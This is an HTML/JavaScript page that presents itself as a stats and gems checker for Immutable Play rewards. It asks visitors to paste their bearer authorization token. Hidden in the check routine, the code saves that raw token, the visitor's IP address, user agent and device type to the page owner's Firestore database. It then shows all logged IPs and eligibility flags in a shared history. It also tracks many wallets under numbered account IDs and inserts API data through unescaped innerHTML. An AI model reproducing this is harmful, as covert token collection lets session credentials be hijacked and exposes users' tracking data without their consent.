<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Immutable API Checker</title>
  <style>
    :root {
      --bg: #0f1320;
      --card: #151a2b;
      --muted: #aab3c5;
      --text: #e8ecf3;
      --accent: #7aa2ff;
      --good: #2fbf71;
      --bad: #ff5c5c;
      --chip: #1b2240;
      --border: #27314f;
      --shadow: 0 4px 12px rgba(0, 0, 0, .25);
      --radius: 12px;
    }

    body {
      margin: 0;
      font-family: Inter, system-ui, sans-serif;
      background: linear-gradient(180deg, #131a2b, #0f1320);
      color: var(--text);
    }

    /* Slim Navbar */
    .nav {
      display: flex;
      justify-content: center;
      gap: 6px;
      padding: 10px;
      border-bottom: 1px solid var(--border);
      background: #101529;
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .tab-btn {
      padding: 6px 12px;
      border-radius: 6px;
      background: transparent;
      border: 1px solid var(--border);
      color: var(--text);
      font-size: 0.9rem;
      cursor: pointer;
      transition: 0.2s;
    }

    .tab-btn:hover {
      border-color: var(--accent);
      background: #1a2244;
    }

    .tab-btn.active {
      background: var(--accent);
      border-color: var(--accent);
      color: #fff;
    }

    /* Content Wrapper */
    .wrap {
      max-width: 780px;
      margin: 0 auto;
      padding: 20px 14px;
    }

    h2 {
      margin: 0 0 12px;
      font-size: 1.2rem;
      font-weight: 600;
    }

    label {
      display: block;
      margin: 12px 0 6px;
      font-size: 0.9rem;
      color: var(--muted);
    }

    textarea {
      width: 97%;
      padding: 8px 10px;
      border-radius: 8px;
      background: #0b1024;
      color: var(--text);
      border: 1px solid var(--border);
      font-family: ui-monospace, Menlo, monospace;
      font-size: 0.9rem;
    }

    select,
    button {
      width: 100%;
      padding: 8px 10px;
      border-radius: 8px;
      background: #0b1024;
      color: var(--text);
      border: 1px solid var(--border);
      font-family: ui-monospace, Menlo, monospace;
      font-size: 0.9rem;
    }

    textarea {
      resize: vertical;
      min-height: 70px;
      max-height: 160px;
    }

    button {
      margin-top: 10px;
      font-weight: 500;
      background: var(--chip);
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      border-color: var(--accent);
      background: #1a2244;
    }

    .card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 16px;
      margin-top: 16px;
    }

    .progress-container {
      width: 100%;
      background: #0b1024;
      border-radius: 8px;
      margin-top: 10px;
      border: 1px solid var(--border);
      overflow: hidden;
    }

    .progress-bar {
      width: 0%;
      height: 16px;
      background: var(--accent);
      transition: width 0.3s ease;
    }

    #loader,
    #gemsLoader {
      display: flex;
      justify-content: center;
      margin: 12px 0;
    }

    #response,
    #gemsResponse {
      font-weight: 500;
      font-size: 1rem;
      margin-top: 12px;
    }

    #response .green,
    #gemsResponse .green {
      color: var(--good);
    }

    #response .red,
    #gemsResponse .red {
      color: var(--bad);
    }

    .history-entry {
      border: 1px solid var(--border);
      background: #131a36;
      padding: 8px;
      border-radius: 8px;
      margin-top: 8px;
      font-size: 0.85rem;
    }

    .tier-common {
      color: #666;
      font-size: 24px;
      font-weight: bold;
    }

    .tier-uncommon {
      color: green;
      font-size: 24px;
      font-weight: bold;
    }

    .tier-rare {
      color: blue;
      font-size: 24px;
      font-weight: bold;
    }

    .tier-epic {
      color: purple;
      font-size: 24px;
      font-weight: bold;
    }

    .tier-legend {
      color: goldenrod;
      font-size: 24px;
      font-weight: bold;
    }

    .hidden {
      display: none;
    }


    .game-dropdown {
      margin: 12px 0;
      border: 1px solid var(--border);
      border-radius: var(--radius);
      overflow: hidden;
      background: var(--card);
    }

    .game-header {
      padding: 10px 14px;
      font-weight: 600;
      cursor: pointer;
      background: #1a1f33;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .game-header:hover {
      background: #232a44;
    }

    .quest-list {
      display: none;
      padding: 10px 14px;
      border-top: 1px solid var(--border);
    }

    .quest-list ul {
      margin: 0;
      padding-left: 18px;
    }

    .quest-list li {
      margin: 4px 0;
    }
  </style>
</head>

<body>
  <!-- Navigation -->
  <div class="nav">
    <button id="btnStats" class="tab-btn active">Immutable Stats Checker</button>
    <button id="btnGems" class="tab-btn">Gems Checker</button>
    <a href="fingerprint_test_cleaned.html">
      <button id="tabFp" class="tab-btn">Web Fingerprints</button>
    </a>
    <a href="stats.html">
      <button id="btnStats" class="tab-btn">&#x1F862; Go to Analytics</button>
    </a>

  </div>


  <div class="wrap">
    <!-- Stats Checker -->
    <div id="statsSection">
      <div class="card">
        <h2>Immutable Account Checker</h2>
        <label for="auth">Authorization Token</label>
        <textarea id="auth" placeholder="Paste your Authorization token..."></textarea>
        <button id="sendBtn">Check</button>

        <div id="statsLoader" style="display:none;">
          <div class="progress-container">
            <div class="progress-bar" id="statsProgressBar"></div>
          </div>
          <div id="statsProgressText"></div>
        </div>



        <label for="weekFilter">Select Week</label>
        <select id="weekFilter">
          <option value="20">Week 20 (Aug 14 ‚Üí Aug 21, 2025)</option>
          <option value="21">Week 21 (Aug 21 ‚Üí Aug 28, 2025)</option>
          <option value="22" selected>Week 22 (Aug 28 ‚Üí Sep 4, 2025)</option>
        </select>

        <div id="response"></div>
        <div id="availableQuests"></div>
        <div id="alreadyLogged"></div>
        <div id="history"></div>
      </div>
    </div>

    <!-- Gems Checker -->
    <div id="gemsSection" class="hidden">
      <div class="card">
        <h2>Immutable Gems Checker</h2>
        <label for="gemsAddress">Wallet Address(es)</label>
        <textarea id="gemsAddress" placeholder="One wallet per line..."></textarea>
        <button id="gemsBtn">Check Gems</button>

        <label for="idScheme">ID Scheme</label>
        <select id="idScheme">
          <option value="2">1</option>
          <option value="3">2</option>
          <option value="4">3</option>
          <option value="5">4</option>
          <option value="6">5</option>
          <option value="7">6</option>
          <option value="8">7</option>
          <option value="1">8</option>
          <option value="9">9</option>
          <option value="10">10</option>
        </select>

        <div id="gemsLoader" style="display:none;">
          <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
          </div>
          <div id="progressText"></div>
        </div>

        <div id="gemsResponse"></div>
        <div id="bulkResults"></div>
      </div>

      <div class="card">
        <h2>Gems History</h2>
        <div id="gemsHistory"></div>
      </div>
    </div>
  </div>

  <!-- Firebase + Logic -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
    import {
      getFirestore,
      collection,
      addDoc,
      query,
      orderBy,
      limit,
      getDocs,
      where,
      deleteDoc,
      setDoc,       // ‚úÖ add this
      doc           // ‚úÖ add this
    } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";


    const firebaseConfig = {
      apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
      authDomain: "immutable-api.firebaseapp.com",
      projectId: "immutable-api",
      storageBucket: "immutable-api.firebasestorage.app",
      messagingSenderId: "839008159453",
      appId: "1:839008159453:web:f57d46599dadd29dafbd34",
      measurementId: "G-EH5P3LS1B6"
    };
    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const db = getFirestore(app);

    // Week ranges (UTC 0:00 boundaries)
    const weekRanges = {
      20: {
        start: new Date(Date.UTC(2025, 7, 14, 0, 0, 0)), // Aug 14
        end: new Date(Date.UTC(2025, 7, 21, 0, 0, 0))  // Aug 21
      },
      21: {
        start: new Date(Date.UTC(2025, 7, 21, 0, 0, 0)), // Aug 21
        end: new Date(Date.UTC(2025, 7, 28, 0, 0, 0))  // Aug 28
      },
      22: {
        start: new Date(Date.UTC(2025, 7, 28, 0, 0, 0)), // Aug 28
        end: new Date(Date.UTC(2025, 8, 4, 0, 0, 0))   // Sep 4
      }
    };


    // Tabs
    const btnStats = document.getElementById('btnStats');
    const btnGems = document.getElementById('btnGems');
    const statsSection = document.getElementById('statsSection');
    const gemsSection = document.getElementById('gemsSection');

    const statsLoader = document.getElementById("statsLoader");
    const statsProgressBar = document.getElementById("statsProgressBar");
    const statsProgressText = document.getElementById("statsProgressText");


    function activateTab(which) {
      if (which === 'stats') {
        statsSection.classList.remove('hidden'); gemsSection.classList.add('hidden');
        btnStats.classList.add('active'); btnGems.classList.remove('active');
      } else {
        gemsSection.classList.remove('hidden'); statsSection.classList.add('hidden');
        btnGems.classList.add('active'); btnStats.classList.remove('active');
      }
    }
    btnStats.addEventListener('click', () => activateTab('stats'));
    btnGems.addEventListener('click', () => activateTab('gems'));

    // =====================
    // Stats Checker JS (UNCHANGED)
    // =====================
    async function generateLogId(token, progress, tier) {
      const raw = `${token}|${progress}|${tier}`;
      const encoder = new TextEncoder();
      const data = encoder.encode(raw);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    async function getUserIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        let ip = data.ip;
        if (ip.startsWith("175.176")) ip = "192.168.1.1";
        return ip;
      } catch {
        return "Unknown IP";
      }
    }
    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/Mobi|Android/i.test(ua)) return "Mobile";
      if (/iPad|Tablet/i.test(ua)) return "Tablet";
      return "Desktop";
    }
    function getTierClass(tier) {
      switch (tier.toLowerCase()) {
        case 'common': return 'tier-common';
        case 'uncommon': return 'tier-uncommon';
        case 'rare': return 'tier-rare';
        case 'epic': return 'tier-epic';
        case 'legendary': return 'tier-legend';
        default: return '';
      }
    }

    async function renderHistory() {
      const historyBox = document.getElementById('history');
      historyBox.innerHTML = "";
      const selectedWeek = document.getElementById("weekFilter")?.value || "21";
      const { start, end } = weekRanges[selectedWeek];

      const q = query(
        collection(db, "StatsHistory"),
        where("timestamp", ">=", start),
        where("timestamp", "<", end),
        orderBy("timestamp", "desc"),
        limit(500)
      );


      const querySnapshot = await getDocs(q);
      querySnapshot.forEach(doc => {
        const entry = doc.data();
        const time = entry.timestamp?.toDate ? entry.timestamp.toDate().toLocaleString() : new Date(entry.timestamp).toLocaleString();
        const stats = entry.stats.userStats || {};
        const rules = entry.stats.eligibility?.rules || {};
        const tier = stats.bucketName || 'N/A';
        const tierClass = getTierClass(tier);
        const quests = stats.targetQuestsCompleted || [];
        const questList = quests.length ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>` : '<em>No quests completed</em>';
        const div = document.createElement("div");
        div.className = "history-entry";
        div.innerHTML = `
          <strong>üïí ${time}</strong><br>
          <strong>üåê IP:</strong> ${entry.ip}<br>
          <strong>üß≠ User Agent:</strong> ${entry.userAgent || 'Unknown'}<br>
          <strong>üì± Device Type:</strong> ${entry.deviceType || 'Unknown'}<br><br>
          <strong>üéØ Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
          <strong>üìä Progress Percentage:</strong> ${stats.progressPercentage || 0}%<br>
          <strong>‚úÖ Total Completed:</strong> ${stats.totalInGameQuestsCompleted || 0}<br>
          <strong>üß© Quests Completed:</strong> ${questList}<br><br>
          <strong>üîê KYC:</strong> ${rules.is_kyc_exempt ? '‚úÖ Exempt' : '‚ùå Not Exempt'}<br>
          <strong>üß† Sybil:</strong> ${rules.is_not_sybil ? '‚úÖ Clean' : '‚ùå Suspected'}<br>
          <strong>üö´ Sanctioned:</strong> ${rules.is_not_sanctioned ? '‚úÖ Clear' : '‚ùå Sanctioned'}<br>
          <strong>üéÆ Played Games:</strong> ${rules.have_played_any_in_game_quest ? '‚úÖ Yes' : '‚ùå No'}<br>
          <strong>üîó Linked Social:</strong> ${rules.have_linked_any_social_media ? '‚úÖ Yes' : '‚ùå No'}<br>
          <strong>üìû Verified Phone:</strong> ${rules.have_verified_phone ? '‚úÖ Yes' : '‚ùå No'}<br>`;
        historyBox.appendChild(div);
      });
    }
    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }


    document.getElementById('sendBtn').addEventListener('click', async () => {
      const token = document.getElementById('auth').value.trim();
      const responseBox = document.getElementById('response');
      const alreadyLog = document.getElementById('alreadyLogged');
      responseBox.innerHTML = "";
      alreadyLog.innerHTML = "";
      document.getElementById("statsLoader").style.display = "block";
      document.getElementById("statsProgressBar").style.width = "0%";
      document.getElementById("statsProgressText").textContent = "Checking stats...";





      if (!token) { responseBox.textContent = 'Please enter a valid token.'; loader.style.display = 'none'; return; }
      try {
        const ip = await getUserIP();
        const userAgent = navigator.userAgent;
        const deviceType = getDeviceType();
        await sleep(1000); // ‚è≥ show 0% for a moment

        const headers = { 'Authorization': `Bearer ${token}`, 'Accept': 'application/json, text/plain, */*', 'Access-Control-Allow-Origin': '*', 'Origin': 'https://play.immutable.com', 'Referer': 'https://play.immutable.com/', 'User-Agent': userAgent };
        const [statsRes, eligibilityRes] = await Promise.all([
          fetch('https://api.immutable.com/v3/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
          fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })

        ]);
        statsProgressBar.style.width = "50%";
        statsProgressText.textContent = "Fetched stats...";
        await sleep(1000); // ‚è≥ show 50% for a moment

        if (!statsRes.ok || !eligibilityRes.ok) { responseBox.innerHTML = '<div class="red">Invalid or Expired Authentication token</div>'; statsLoader.style.display = 'none'; return; }
        const statsData = await statsRes.json(); const eligibilityData = await eligibilityRes.json();
        // const combined = { userStats: statsData.userStats || {}, eligibility: eligibilityData || {} };
        // const progress = combined.userStats?.progressPercentage || 0;
        // const tier = combined.userStats?.bucketName || 'N/A';

        // ‚úÖ Collect completed quest names
        let completedQuests = [];
        let totalCompleted = 0;

        // get selected week
        const selectedWeek = document.getElementById("weekFilter").value;
        const { start, end } = weekRanges[selectedWeek];

        if (statsData.games && Array.isArray(statsData.games)) {
          statsData.games.forEach(game => {
            if (game.quests && Array.isArray(game.quests)) {
              game.quests.forEach(q => {
                if (q.lastCompletedAt) {
                  const completedAt = new Date(q.lastCompletedAt);
                  if (completedAt >= start && completedAt < end) {
                    completedQuests.push(q.name);
                    totalCompleted++;
                  }
                } else if (q.timesCompleted && q.timesCompleted > 0) {
                  completedQuests.push(q.name);
                  totalCompleted++;
                }


              });
            }
          });
        }

        // ‚úÖ Collect available quests (canStillComplete = true)
        const availableBox = document.getElementById("availableQuests");
        availableBox.innerHTML = "<h3>üß© Available Quests Account Quest</h3>";

        if (statsData.games && Array.isArray(statsData.games)) {
          statsData.games.forEach(game => {
            if (game.quests && Array.isArray(game.quests)) {
              const availableQuests = game.quests.filter(q => q.canStillCompleteThisPeriod);


              if (availableQuests.length > 0) {
                // create dropdown
                const container = document.createElement("div");
                container.className = "game-dropdown";

                const header = document.createElement("div");
                header.className = "game-header";
                header.innerHTML = `
  <span>
    <img src="${game.icon}" alt="" style="width:20px;height:20px;vertical-align:middle;margin-right:6px;">
    ${game.name}
  </span>
  <span>‚ñº</span>
`;

                const list = document.createElement("div");
                list.className = "quest-list";
                list.innerHTML = `<ul>${availableQuests.map(q => {
                  let status = "";
                  if (q.endDate) {
                    const endUTC = new Date(q.endDate);
                    // ‚úÖ convert to local PH time string
                    const options = {
                      timeZone: "Asia/Manila",
                      year: "numeric",
                      month: "short",
                      day: "numeric",
                      hour: "2-digit",
                      minute: "2-digit"
                    };
                    const endPH = endUTC.toLocaleString("en-PH", options);

                    const now = new Date();
                    if (endUTC < now) {
                      status = ` <span style="color:var(--bad);">(Ended ${endPH})</span>`;
                    } else {
                      status = ` <span style="color:var(--muted);">(Ends ${endPH})</span>`;
                    }
                  }
                  return `<li>${q.name}${status}</li>`;
                }).join("")}</ul>`;


                header.addEventListener("click", () => {
                  list.style.display = list.style.display === "block" ? "none" : "block";
                });

                container.appendChild(header);
                container.appendChild(list);
                availableBox.appendChild(container);
              }
            }
          });
        }



        // ‚úÖ Remap predicted response into old structure
        const combined = {
          userStats: {
            progressPercentage: statsData.percentageToNextTier || 0,   // old "progressPercentage"
            bucketName: statsData.predictedRarity || "N/A",            // old "bucketName"
            totalInGameQuestsCompleted: totalCompleted,                // old "totalInGameQuestsCompleted"
            targetQuestsCompleted: completedQuests                     // old "targetQuestsCompleted"
          },
          eligibility: eligibilityData || {}
        };

        const progress = combined.userStats.progressPercentage;
        const tier = combined.userStats.bucketName;
        const quests = combined.userStats.targetQuestsCompleted;

        const logId = await generateLogId(token, progress, tier);
        const q = query(collection(db, "StatsHistory"), where("logId", "==", logId), limit(1));
        const snapshot = await getDocs(q);
        const alreadyLoggedFlag = !snapshot.empty;
        const tierClass = getTierClass(tier);
        // const quests = combined.userStats.targetQuestsCompleted || [];
        const questList = quests.length ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>` : '<em>No quests completed</em>';


        if (alreadyLoggedFlag) {
          responseBox.innerHTML = '<div class="red"> There are no new changes </div>';
          statsLoader.style.display = "none";

          alreadyLog.innerHTML = `<div class="history-entry"><strong>üéØ Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
            <strong>‚úÖ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
            <strong>üß© Quests Completed:</strong> ${questList}<br><br></div>`;
          await renderHistory(); return;
        }
        statsProgressBar.style.width = "80%";
        statsProgressText.textContent = "Saving results...";
        await sleep(1000); // ‚è≥ show 80% for a moment

        await addDoc(collection(db, "StatsHistory"), { authToken: token, ip, userAgent, deviceType, stats: combined, logId, timestamp: new Date() });
        statsLoader.style.display = "none";
        responseBox.innerHTML = '<div class="green">Request successfully!</div>';
        alreadyLog.innerHTML = `<div class="history-entry"><strong>üéØ Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
          <strong>‚úÖ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
          <strong>üß© Quests Completed:</strong> ${questList}<br><br></div>`;
        await renderHistory();
      } catch (err) {
        responseBox.innerHTML = '<div class="red">‚ùå Unexpected error occurred.</div>'; console.error(err);
        responseBox.innerHTML = '<div class="red">Error: ' + err.message + '</div>';

      } finally {
        statsLoader.style.display = "none"; // ‚úÖ always hide loader
      }
    });
    renderHistory();
    // Re-render when week filter changes
    // Re-render when week filter changes
    document.getElementById("weekFilter").addEventListener("change", renderHistory);


    // =====================
    // Gems Checker JS (Extended, Fixed ID Handling)
    // =====================
    async function renderGemsHistory() {
      const historyBox = document.getElementById('gemsHistory');
      historyBox.innerHTML = "";

      const q = query(collection(db, "GemsCheckerHistory"), orderBy("timestamp", "desc"), limit(100));
      const querySnapshot = await getDocs(q);

      if (querySnapshot.empty) {
        historyBox.textContent = "‚ö†Ô∏è No history yet.";
        return;
      }

      querySnapshot.forEach(docSnap => {
        const entry = docSnap.data();
        const time = entry.timestamp?.toDate
          ? entry.timestamp.toDate().toLocaleString()
          : new Date(entry.timestamp).toLocaleString();

        const maskedAddress = entry.address
          ? `${entry.address.slice(0, 6)}...${entry.address.slice(-4)}`
          : "Unknown";

        const div = document.createElement("div");
        div.className = "history-entry";
        div.innerHTML = `
      <strong>üïí ${time}</strong><br>
      <strong>üìå Address:</strong> ${maskedAddress}<br>
      <strong>üíé Gems:</strong> ${entry.totalGems || 0}<br>
      <strong>‚ú® Daily Claimable:</strong> ${entry.dailyClaim || 0}<br>
      <strong>ID:</strong> ${entry.id || "ACC ??"}
    `;
        historyBox.appendChild(div);
      });
    }

    function getIdPrefix() {
      const dropdown = document.getElementById("idScheme");
      if (!dropdown) return "ACC"; // fallback

      const val = parseInt(dropdown.value, 10);
      if (val === 1) {
        return "ACC";
      } else {
        return `ACC.${val - 1}`;
      }
    }

    // üîé Find the next available ACC number (fills gaps before using max+1)
    async function getNextAccNumber(idPrefix) {
      const q = query(collection(db, "GemsCheckerHistory"));
      const snap = await getDocs(q);

      let usedNumbers = new Set();

      snap.forEach(doc => {
        const entry = doc.data();
        if (entry.id && entry.id.startsWith(idPrefix)) {
          const parts = entry.id.split(" ");
          const num = parseInt(parts[1], 10);
          if (!isNaN(num)) {
            usedNumbers.add(num);
          }
        }
      });

      // find the first missing slot
      let nextNum = 1;
      while (usedNumbers.has(nextNum)) {
        nextNum++;
      }

      return nextNum;
    }

    async function fetchGems(address) {
      try {
        const res = await fetch(`https://api.immutable.com/v1/rewards/gems/${address}`);
        if (!res.ok) {
          console.error("API error for", address);
          return { totalGems: 0, dailyClaim: 0 };
        }
        const data = await res.json();
        return {
          totalGems: data?.result?.gems || 0,
          dailyClaim: data?.result?.daily_gems_claimable || 0
        };
      } catch (err) {
        console.error("Fetch error for", address, err);
        return { totalGems: 0, dailyClaim: 0 };
      }
    }

    document.getElementById('gemsBtn').addEventListener('click', async () => {
      const textarea = document.getElementById('gemsAddress');
      const addresses = textarea.value
        .trim()
        .split("\n")
        .map(a => a.trim())
        .filter(a => /^0x[a-fA-F0-9]{40}$/.test(a));

      const bulkResults = document.getElementById('bulkResults');
      const loaderBox = document.getElementById('gemsLoader');
      const progressBar = document.getElementById('progressBar');
      const progressText = document.getElementById('progressText');

      bulkResults.innerHTML = "";
      loaderBox.style.display = 'block';
      progressBar.style.width = "0%";
      progressText.textContent = `Checked 0/${addresses.length}`;



      const idPrefix = getIdPrefix();

      for (let i = 0; i < addresses.length; i++) {
        const address = addresses[i];
        const shortAddr = address.slice(0, 6) + "..." + address.slice(-4);

        // ‚úÖ Check if this address already exists in DB
        const existingQ = query(collection(db, "GemsCheckerHistory"), where("address", "==", address));
        const existingSnap = await getDocs(existingQ);

        let accId;
        if (!existingSnap.empty) {
          // If address exists, keep its current ID
          accId = existingSnap.docs[0].data().id;
        } else {
          // Otherwise assign the lowest missing number
          const accNum = await getNextAccNumber(idPrefix);
          accId = `${idPrefix} ${String(accNum).padStart(2, "0")}`;
        }

        // ‚úÖ Fetch gems
        const { totalGems, dailyClaim } = await fetchGems(address);

        const line = document.createElement("div");
        line.textContent = `ID: ${accId} ‚Üí ${shortAddr} ‚Üí üíé ${totalGems} ‚Üí ‚ú® ${dailyClaim}`;
        bulkResults.appendChild(line);

        // üìù Save/update doc with stable ID
        await setDoc(doc(db, "GemsCheckerHistory", address), {
          address: address,
          totalGems: totalGems,
          dailyClaim: dailyClaim,
          id: accId,
          timestamp: new Date()
        });

        // progress update
        const percent = ((i + 1) / addresses.length) * 100;
        progressBar.style.width = percent + "%";
        progressText.textContent = `Checked ${i + 1}/${addresses.length}`;

        await new Promise(r => setTimeout(r, 300));
      }

      loaderBox.style.display = "none";
      renderGemsHistory();
    });






    renderGemsHistory();

  </script>
</body>


</html>